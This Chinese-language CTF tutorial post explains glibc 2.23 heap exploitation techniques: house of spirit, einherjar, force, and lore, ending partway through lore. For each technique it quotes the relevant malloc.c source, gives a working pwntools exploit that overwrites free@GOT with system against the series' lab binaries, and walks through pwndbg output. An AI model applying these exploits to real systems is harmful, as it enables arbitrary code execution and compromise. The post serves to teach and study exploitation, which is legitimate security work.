---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其三
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其三

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-13 house of spirit

本方法利用glibc对于fast bin管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3897)

```C
if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
    /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
    */
    && (chunk_at_offset(p, size) != av->top)
#endif
    ) {

  if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) <= bug
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
    {
	/* We might not have a lock at this point and concurrent modifications
	   of system_mem might have let to a false positive.  Redo the test
	   after getting the lock.  */
	if (have_lock
	    || ({ assert (locked == 0);
		  mutex_lock(&av->mutex);
		  locked = 1;
		  chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem;
	      }))
	  {
	    errstr = "free(): invalid next size (fast)";
	    goto errout;
	  }
	if (! have_lock)
	  {
	    (void)mutex_unlock(&av->mutex);
	    locked = 0;
	  }
    }

  free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

  set_fastchunks(av);
  unsigned int idx = fastbin_index(size);
  fb = &fastbin (av, idx);
```

在glibc 2.23版本中，fast bin的释放路径存在验证机制缺陷，具体表现为对chunk的size与next_size字段检查不够严格。其中，size需大于2 * SIZE_SZ，而next_size需小于av->system_mem，这些条件在通常情况下较易满足，致使伪造的chunk可通过_int_free函数验证并进入fast bin，从而实现任意地址操作。此外，在受限情况下，攻击者可借助unsorted bin attack或large bin attack等技术修改av->system_mem，以绕过next_size的检查约束。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/18/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_spirit/exploit.py)。

核心利用代码如下：

```python
# house of spirit
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)

# unsorted bin leak
malloc(0, 0x80)
malloc(1, 0x18)
delete(0)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena88 addr: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base addr: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
system_mem = libc.sym["main_arena"] + 0x880
log.info(f"system_mem addr: {hex(system_mem)}")

# unsorted bin attack
payload = p64(main_arena88) + p64(system_mem - 0x10)
edit(0, len(payload), payload)
malloc(2, 0x80)

payload = b"\x00" * 0x20 + p64(0) + p64(0x40)
payload += p64(0) + p64(0x404120 - 0x10)
change_profile(b"\x00" * 8, payload)
delete(-1)
malloc(3, 0x30)

# 00404000  void (* const free)(void* mem) = free
payload = b"\x00" * 0x10 + p64(0) + p64(binsh_addr)
payload += p64(0x8) + p64(0x00404000)
edit(3, len(payload), payload)
edit(1, 0x8, p64(system))
delete(0)
cmd = b"cat src/2.23/house_of_spirit/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak技术泄露libc地址，为后面的利用做好基础。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x17021000
Size: 0x90 (with flag bits: 0x91)
fd: 0x743ab998db78
bk: 0x743ab998db78

Allocated chunk
Addr: 0x17021090
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x170210b0
Size: 0x20f50 (with flag bits: 0x20f51)

pwndbg> unsortedbin 
unsortedbin
all: 0x17021000 —▸ 0x743ab998db78 (main_arena+88) ◂— 0x17021000
pwndbg> p/x main_arena.system_mem
$1 = 0x21000
pwndbg> 
```

然后利用unsorted bin attack技术修改main_arena.system_mem大小，使其绕过`__builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)`检查。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x17021000
Size: 0x90 (with flag bits: 0x91)
fd: 0x743ab998db78
bk: 0x743ab998e390

Allocated chunk | PREV_INUSE
Addr: 0x17021090
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x170210b0
Size: 0x20f50 (with flag bits: 0x20f51)

pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x17021000 —▸ 0x743ab998db78 (main_arena+88) ◂— 0x17021000
BK: 0x743ab998e390 (main_arena+2160) ◂— 0x21000
pwndbg> p/x main_arena.system_mem
$2 = 0x743ab998db78
pwndbg> 
```

接着在.bss上伪造fast bin范围的chunk。

```bash
pwndbg> x/16gx profile.introduction
0x4040e0 <profile+32>:  0x0000000000000000      0x0000000000000000
0x4040f0 <profile+48>:  0x0000000000000000      0x0000000000000000
0x404100 <profile+64>:  0x0000000000000000      0x0000000000000040 <= fake size(0x0000000000000040)
0x404110 <profile+80>:  0x0000000000000000      0x0000000000404110
0x404120 <chunks>:      0x0000000000000010      0x0000000017021010
0x404130 <chunks+16>:   0x0000000000000018      0x00000000170210a0
0x404140 <chunks+32>:   0x0000000000000080      0x0000000017021010 <= fake nextsize(0x0000000017021010)
0x404150 <chunks+48>:   0x0000000000000000      0x0000000000000000
pwndbg> malloc-chunk -v 0x404100

Addr: 0x404100
prev_size: 0x00
size: 0x40 (with flag bits: 0x40)
fd: 0x00
bk: 0x404110
fd_nextsize: 0x10
bk_nextsize: 0x17021010

pwndbg> 
```

释放0x404100fake chunk，可以发现已经进入fast bin。

```bash
pwndbg> fastbins 
fastbins
0x40: 0x404100 (profile+64) ◂— 0
pwndbg> x/10gx 0x404100
0x404100 <profile+64>:  0x0000000000000000      0x0000000000000040
0x404110 <profile+80>:  0x0000000000000000      0x0000000000404110
0x404120 <chunks>:      0x0000000000000010      0x0000000017021010
0x404130 <chunks+16>:   0x0000000000000018      0x00000000170210a0
0x404140 <chunks+32>:   0x0000000000000080      0x0000000017021010
pwndbg> 
```

控制了chunks的内容，获取shell自然是手到擒来，故不再赘述。


### 1-14 house of einherjar

本方法利用glibc对于consolidate backward管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4002)

```C
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = p->prev_size;
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  unlink(av, p, bck, fwd);
}

#define unlink(AV, P, BK, FD)                                                  \
  {                                                                            \
    FD = P->fd;                                                                \
    BK = P->bk;                                                                \
    if (__builtin_expect(FD->bk != P || BK->fd != P, 0))                       \
      malloc_printerr(check_action, "corrupted double-linked list", P, AV);    \
    else {                                                                     \
      FD->bk = BK;                                                             \
      BK->fd = FD;                                                             \
      if (!in_smallbin_range(P->size) &&                                       \
          __builtin_expect(P->fd_nextsize != NULL, 0)) {                       \
        if (__builtin_expect(P->fd_nextsize->bk_nextsize != P, 0) ||           \
            __builtin_expect(P->bk_nextsize->fd_nextsize != P, 0))             \
          malloc_printerr(check_action,                                        \
                          "corrupted double-linked list (not small)", P, AV);  \
        if (FD->fd_nextsize == NULL) {                                         \
          if (P->fd_nextsize == P)                                             \
            FD->fd_nextsize = FD->bk_nextsize = FD;                            \
          else {                                                               \
            FD->fd_nextsize = P->fd_nextsize;                                  \
            FD->bk_nextsize = P->bk_nextsize;                                  \
            P->fd_nextsize->bk_nextsize = FD;                                  \
            P->bk_nextsize->fd_nextsize = FD;                                  \
          }                                                                    \
        } else {                                                               \
          P->fd_nextsize->bk_nextsize = P->bk_nextsize;                        \
          P->bk_nextsize->fd_nextsize = P->fd_nextsize;                        \
        }                                                                      \
      }                                                                        \
    }                                                                          \
  }
```

在glibc 2.23版本中，consolidate backward的释放路径存在验证机制缺陷，具体表现为未对prevsize大小做任何限制。致使特殊伪造的chunk可以通过unlink函数验证进而将目标地址提取至unsorted bin中，从而实现任意地址操作。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/09/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_einherjar/exploit.py)。

核心利用代码如下：

```python
conn.sendlineafter(b"Enter author name: ", b"A" * 0x8)
conn.sendlineafter(b"Enter introduction: ", b"A" * 0x8)
# unsorted bin leak
malloc(0, 0x18, b"A" * 0x8)
malloc(1, 0xF8, b"B" * 0x8)
malloc(2, 0x18, b"C" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)
malloc(4, 0x18, b"E" * 0x8)
delete(1)
delete(3)
author_name, introduction, content = show(1)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# leak heap addr
edit(1, 0x8, b"A" * 0x8)
author_name, introduction, content = show(1)
chunk3_addr = u64(content[8 : 8 + 4].ljust(8, b"\x00"))
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
edit(1, 0x8, p64(main_arena88))
malloc(1, 0xF8, b"B" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)

# house of einherjar
fake_size = chunk3_addr - 0x004040E0
payload = b"C" * 0x10 + p64(fake_size) + b"\x00"
edit(2, len(payload), payload)
payload = p64(0x100) + p64(fake_size) + p64(0x004040E0) * 4
change_profile(b"A" * 0x8, payload)
delete(3)
payload = p64(0x100) + p64(0x100) + p64(main_arena88) * 4
change_profile(b"A" * 0x8, payload)
malloc(5, 0xF8, b"F" * 0x8)
payload = b"A" * (0x404120 - 0x004040E0 - 0x10)
payload += p64(0x18) + p64(0x00404000)
payload += p64(0xF8) + p64(binsh_addr)
edit(5, len(payload), payload)
edit(0, 0x8, p64(libc.sym["system"]))
delete(1)
cmd = b"cat src/2.23/house_of_einherjar/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak泄露出来libc地址与heap地址，为后续的利用做好基础准备。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x4e9a000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x4e9a020
Size: 0x100 (with flag bits: 0x101)
fd: 0x79f838d8db78
bk: 0x4e9a140

Allocated chunk
Addr: 0x4e9a120
Size: 0x20 (with flag bits: 0x20)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x4e9a140
Size: 0x100 (with flag bits: 0x101)
fd: 0x4e9a020
bk: 0x79f838d8db78

Allocated chunk
Addr: 0x4e9a240
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x4e9a260
Size: 0x20da0 (with flag bits: 0x20da1)

pwndbg> unsortedbin 
unsortedbin
all: 0x4e9a140 —▸ 0x4e9a020 —▸ 0x79f838d8db78 (main_arena+88) ◂— 0x4e9a140
pwndbg> 
```

然后在.bss上伪造fake chunk用来绕过unlink等相关校验，特别注意需要修改目标chunk的prev_in_use字段，使其进入consolidate backward的释放路径。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x4e9a000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x4e9a020
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE
Addr: 0x4e9a120
Size: 0x20 (with flag bits: 0x21)

Allocated chunk
Addr: 0x4e9a140
Size: 0x100 (with flag bits: 0x100)   <= 0x101 -> 0x100

Allocated chunk | PREV_INUSE
Addr: 0x4e9a240
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x4e9a260
Size: 0x20da0 (with flag bits: 0x20da1)

pwndbg> x/10gx profile.introduction 
0x4040e0 <profile+32>:  0x0000000000000100      0x0000000004a96060 <=  prev size(0x0000000000000100) | fake size(0x0000000004a96060)
0x4040f0 <profile+48>:  0x00000000004040e0      0x00000000004040e0
0x404100 <profile+64>:  0x00000000004040e0      0x00000000004040e0
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000000
0x404120 <chunks>:      0x0000000000000018      0x0000000004e9a010
pwndbg> 
```

接着释放0x4e9a140chunk，进入consolidate backward的释放路径。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:4006
   4000 
   4001     /* consolidate backward */
   4002     if (!prev_inuse(p)) {
   4003       prevsize = p->prev_size;
   4004       size += prevsize;
   4005       p = chunk_at_offset(p, -((long) prevsize));
 ► 4006       unlink(av, p, bck, fwd);
   
pwndbg> p/x p
$5 = 0x4040e0
pwndbg> x/10gx p
0x4040e0 <profile+32>:  0x0000000000000100      0x0000000004a96060
0x4040f0 <profile+48>:  0x00000000004040e0      0x00000000004040e0
0x404100 <profile+64>:  0x00000000004040e0      0x00000000004040e0
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000000
0x404120 <chunks>:      0x0000000000000018      0x0000000004e9a010
pwndbg> 
```

经过unlin之后，p被移动至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x4040e0 (profile+32) —▸ 0x79f838d8db78 (main_arena+88) ◂— 0x4040e0 (profile+32)
pwndbg> 
```

控制了.bss里的0x4040e0之后，获取shell操作轻而易举。


### 1-15 house of force

本方法利用glibc对于use_top管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3777)

```C
use_top:
  /*
     If large enough, split off the chunk bordering the end of memory
     (held in av->top). Note that this is in accord with the best-fit
     search rule.  In effect, av->top is treated as larger (and thus
     less well fitting) than any other available chunk since it can
     be extended to be as large as necessary (up to system
     limitations).

     We require that av->top always exists (i.e., has size >=
     MINSIZE) after initialization, so if it would otherwise be
     exhausted by current request, it is replenished. (The main
     reason for ensuring it exists is that we may need MINSIZE space
     to put in fenceposts in sysmalloc.)
   */

  victim = av->top;
  size = chunksize (victim);

  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) <= bug
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (victim, nb);
      av->top = remainder;
      set_head (victim, nb | PREV_INUSE |
                (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);

      check_malloced_chunk (av, victim, nb);
      void *p = chunk2mem (victim);
      alloc_perturb (p, bytes);
      return p;
    }
```

在glibc 2.23版本中，use_top的申请路径存在验证机制缺陷，具体表现为基本上未对top-chunk->size大小做任何限制。除了size需大于nb + MINSIZE，这个条件在通常情况下较易满足，致使av->top修改为指定目标地址，从而实现任意地址操作。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/09/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_force/exploit.py)。

核心利用代码如下：

```python
conn.sendlineafter(b"Enter author name: ", b"A" * 0x8)
conn.sendlineafter(b"Enter introduction: ", b"A" * 0x8)
# unsorted bin leak
malloc(0, 0x18, b"A" * 0x8)
malloc(1, 0xF8, b"B" * 0x8)
malloc(2, 0x18, b"C" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)
malloc(4, 0x18, b"E" * 0x8)
delete(1)
delete(3)
author_name, introduction, content = show(1)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# leak heap addr
edit(1, 0x8, b"A" * 0x8)
author_name, introduction, content = show(1)
chunk3_addr = u64(content[8 : 8 + 4].ljust(8, b"\x00"))
top_chunk_addr = chunk3_addr + 0x100 + 0x20
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
log.info(f"top chunk addr: {hex(top_chunk_addr)}")
edit(1, 0x8, p64(main_arena88))
malloc(1, 0xF8, b"B" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)

# house of force
#
# This technique also works with Full RELRO but fails due to constraints imposed by one_gadget.
payload = b"E" * 0x18 + p64((-1) & 0xFFFFFFFFFFFFFFFF)
edit(4, len(payload), payload)
# ref how2heap/glibc_2.23/house_of_force.c
#
# The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
# new_top = old_top + nb
# nb = new_top - old_top
# req + 2sizeof(long) = new_top - old_top
# req = new_top - old_top - 2sizeof(long)
# req = dest - 2sizeof(long) - old_top - 2sizeof(long)
# req = dest - old_top - 4*sizeof(long)
fake_size = 0x00404120 - 0x20 - top_chunk_addr
malloc(5, fake_size, b"F" * 0x8)
conn.sendlineafter(b"> ", b"1")
malloc(6, 0x20, p64(0))
payload = p64(0x20) + p64(0x00404000) + p64(0x20) + p64(binsh_addr)
edit(6, len(payload), payload)
edit(0, 0x8, p64(libc.sym["system"]))
delete(1)
cmd = b"cat src/2.23/house_of_force/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak泄露出来libc地址与heap地址，为后续的利用做好基础准备。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x2bc0f000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x2bc0f020
Size: 0x100 (with flag bits: 0x101)
fd: 0x79ea6a98db78
bk: 0x2bc0f140

Allocated chunk
Addr: 0x2bc0f120
Size: 0x20 (with flag bits: 0x20)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x2bc0f140
Size: 0x100 (with flag bits: 0x101)
fd: 0x2bc0f020
bk: 0x79ea6a98db78

Allocated chunk
Addr: 0x2bc0f240
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x2bc0f260
Size: 0x20da0 (with flag bits: 0x20da1)

pwndbg> unsortedbin 
unsortedbin
all: 0x2bc0f140 —▸ 0x2bc0f020 —▸ 0x79ea6a98db78 (main_arena+88) ◂— 0x2bc0f140
pwndbg> 
```

然后，修改top-chunk->size为p64((-1) & 0xFFFFFFFFFFFFFFFF)。

```bash
pwndbg> top-chunk 
Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x2bc0f260
Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)

pwndbg> malloc-chunk -v 0x2bc0f260
Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x2bc0f260
prev_size: 0x4545454545454545
size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00

pwndbg> 
```

使用公式计算出来的fake_size申请内存，进入use_top路径。

```bash
# The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
new_top = old_top + nb
nb = new_top - old_top
req + 2sizeof(long) = new_top - old_top
req = new_top - old_top - 2sizeof(long)
req = dest - 2sizeof(long) - old_top - 2sizeof(long)
req = dest - old_top - 4*sizeof(long)
fake_size = 0x00404120 - 0x20 - top_chunk_addr

In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3796
   3790          to put in fenceposts in sysmalloc.)
   3791        */
   3792 
   3793       victim = av->top;
   3794       size = chunksize (victim);
   3795 
 ► 3796       if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
   3797         {
   3798           remainder_size = size - nb;
   3799           remainder = chunk_at_offset (victim, nb);
   3800           av->top = remainder;
   3801           set_head (victim, nb | PREV_INUSE |
   3802                     (av != &main_arena ? NON_MAIN_ARENA : 0));
   3803           set_head (remainder, remainder_size | PREV_INUSE);
   
pwndbg> p/x (unsigned long) (size)
$1 = 0xfffffffffffffff8
pwndbg> p/x nb
$2 = 0xffffffffd47f4eb0
pwndbg> 
```

由于(unsigned long)的存在，导致`if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))` 条件成立，进入该分支。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3800
   3794       size = chunksize (victim);
   3795 
   3796       if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
   3797         {
   3798           remainder_size = size - nb;
   3799           remainder = chunk_at_offset (victim, nb);
 ► 3800           av->top = remainder;
   3801           set_head (victim, nb | PREV_INUSE |
   3802                     (av != &main_arena ? NON_MAIN_ARENA : 0));
   3803           set_head (remainder, remainder_size | PREV_INUSE);
   3804 
   3805           check_malloced_chunk (av, victim, nb);
   3806           void *p = chunk2mem (victim);
   3807           alloc_perturb (p, bytes);
   
pwndbg> p/x remainder
$3 = 0x404110
pwndbg> x/10gx 0x404110
0x404110 <profile+80>:  0x0000000000000000      0x0000000000000000
0x404120 <chunks>:      0x0000000000000018      0x000000002bc0f010
0x404130 <chunks+16>:   0x00000000000000f8      0x000000002bc0f030
0x404140 <chunks+32>:   0x0000000000000018      0x000000002bc0f130
0x404150 <chunks+48>:   0x00000000000000f8      0x000000002bc0f150
pwndbg> 
```

可以发现av->top即将被修改为.bss上的地址，接下来申请内存，就会从.bss上提取地址返回用户。

```bash
pwndbg> top-chunk 
PREV_INUSE
Addr: 0x404110
Size: 0x2b80b148 (with flag bits: 0x2b80b149)

pwndbg> malloc-chunk -v 0x404110
PREV_INUSE
Addr: 0x404110
prev_size: 0x00
size: 0x2b80b148 (with flag bits: 0x2b80b149)
fd: 0x18
bk: 0x2bc0f010
fd_nextsize: 0xf8
bk_nextsize: 0x2bc0f030

pwndbg> 
```

获取shell控制权变的十分容易，不在此赘述了。


### 1-16 house of lore

本方法利用glibc对于small bin管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3405)

```C
if (in_smallbin_range (nb))
  {
    idx = smallbin_index (nb);
    bin = bin_at (av, idx);

    if ((victim = last (bin)) != bin)
      {
        if (victim == 0) /* initialization check */
          malloc_consolidate (av);
        else
          {
            bck = victim->bk;
	if (__glibc_unlikely (bck->fd != victim))
              {
                errstr = "malloc(): smallbin double linked list corrupted";
                goto errout;
              }
            set_inuse_bit_at_offset (victim, nb);
            bin->bk = bck;
            bck->fd = bin;

            if (av != &main_arena)
              victim->size |= NON_MAIN_ARENA;
            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }
      }
  }
```

在glibc 2.23版本中，small bin的申请路径存在验证机制缺陷，具体表现为未对victim->bk做任何限制。唯一的校验还是`bck->fd != victim`，这个条件也比较容易绕过，使得指定地址进入small bin中，从而实现任意地址操作。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/10/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_lore/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# unsorted bin leak
malloc(0, 0x18, b"A" * 0x8)
malloc(1, 0xF8, b"B" * 0x8)
malloc(2, 0x18, b"C" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)
malloc(4, 0x3E8, b"E" * 0x8)
delete(1)
delete(3)
author_name, introduction, content = show(1)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# leak heap addr
edit(1, 0x8, b"A" * 0x8)
author_name, introduction, content = show(1)
chunk3_addr = u64(content[8 : 8 + 4].ljust(8, b"\x00"))
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
edit(1, 0x8, p64(main_arena88))
malloc(1, 0xF8, b"B" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)

# house of lore
name_payload = p64(0) + p64(0) + p64(chunk3_addr) + p64(0x004040E0)
intro_payload = p64(0) + p64(0) + p64(0x004040C0) + p64(0)
change_profile(name_payload, intro_payload)
delete(3)
malloc(5, 0x4B0, b"F" * 0x8)
author_name, introduction, content = show(3)
main_arena328 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+328: {hex(main_arena328)}")
payload = p64(main_arena328) + p64(0x004040C0)
edit(3, len(payload), payload)
malloc(3, 0xF8, b"D" * 0x8)
malloc(6, 0xF8, b"G" * 0x8)
payload = b"G" * 0x50 + p64(0x18) + p64(0x00404000) + p64(0xF8) + p64(binsh_addr)
edit(6, len(payload), payload)
edit(0, 0x8, p64(libc.sym["system"]))
delete(1)
cmd = b"cat src/2.23/house_of_lore/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先利用unsorted bin leak泄露出来libc地址与heap地址，为后续的利用做好基础准备。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x9cf4000
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x9cf4020
Size: 0x100 (with flag bits: 0x101)
fd: 0x73724fd8db78
bk: 0x9cf4140

Allocated chunk
Addr: 0x9cf4120
Size: 0x20 (with flag bits: 0x20)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x9cf4140
Size: 0x100 (with flag bits: 0x101)
fd: 0x9cf4020
bk: 0x73724fd8db78

Allocated chunk
Addr: 0x9cf4240
Size: 0x3f0 (with flag bits: 0x3f0)

Top chunk | PREV_INUSE
Addr: 0x9cf4630
Size: 0x209d0 (with flag bits: 0x209d1)

pwndbg> unsortedbin 
unsortedbin
all: 0x9cf4140 —▸ 0x9cf4020 —▸ 0x73724fd8db78 (main_arena+88) ◂— 0x9cf4140
pwndbg> 
```

然后，在.bss伪造fake chunk用来绕过small bin相关的校验。

```bash
pwndbg> x/10gx profile.author_name 
0x4040c0 <profile>:     0x0000000000000000      0x0000000000000000 <= fake chunk1
0x4040d0 <profile+16>:  0x0000000009cf4140      0x00000000004040e0
0x4040e0 <profile+32>:  0x0000000000000000      0x0000000000000000 <= fake chunk2
0x4040f0 <profile+48>:  0x00000000004040c0      0x0000000000000000
0x404100 <profile+64>:  0x0000000000000000      0x0000000000000000
pwndbg> malloc-chunk -v 0x4040c0

Addr: 0x4040c0
prev_size: 0x00
size: 0x00 (with flag bits: 0x00)
fd: 0x9cf4140
bk: 0x4040e0
fd_nextsize: 0x00
bk_nextsize: 0x00

pwndbg> malloc-chunk -v 0x4040e0

Addr: 0x4040e0
prev_size: 0x00
size: 0x00 (with flag bits: 0x00)
fd: 0x4040c0
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00

pwndbg> 
```

接着，释放chunks[3]进入unsorted bin。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x9cf4140 —▸ 0x73724fd8db78 (main_arena+88) ◂— 0x9cf4140
pwndbg> 
```

申请chunks[5]，将0x9cf4140从unsortedbin移动至smallbins。

```bash
pwndbg> smallbins 
smallbins
0x100: 0x9cf4140 —▸ 0x73724fd8dc68 (main_arena+328) ◂— 0x9cf4140
pwndbg> 
```

接着修改smallbins->bk为fake chunk1。

```bash
pwndbg> smallbins 
smallbins
0x100 [corrupted]
FD: 0x9cf4140 —▸ 0x73724fd8dc68 (main_arena+328) ◂— 0x9cf4140
BK: 0x9cf4140 —▸ 0x4040c0 (profile) —▸ 0x4040e0 (profile+32) ◂— 0
pwndbg> x/4gx 0x9cf4140
0x9cf4140:      0x0000000000000000      0x0000000000000101
0x9cf4150:      0x000073724fd8dc68      0x00000000004040c0
pwndbg> 
```

申请chunks[3]内存，第一次进入small bin申请路径。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3405
   3399      hold one size each, no searching within bins is necessary.
   3400      (For a large request, we need to wait until unsorted chunks are
   3401      processed to find best fit. But for small ones, fits are exact
   3402      anyway, so we can check now, which is faster.)
   3403    */
   3404 
 ► 3405   if (in_smallbin_range (nb))
   3406     {
   3407       idx = smallbin_index (nb);
   3408       bin = bin_at (av, idx);
   
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3416
   3410       if ((victim = last (bin)) != bin)
   3411         {
   3412           if (victim == 0) /* initialization check */
   3413             malloc_consolidate (av);
   3414           else
   3415             {
 ► 3416               bck = victim->bk;
   3417         if (__glibc_unlikely (bck->fd != victim))

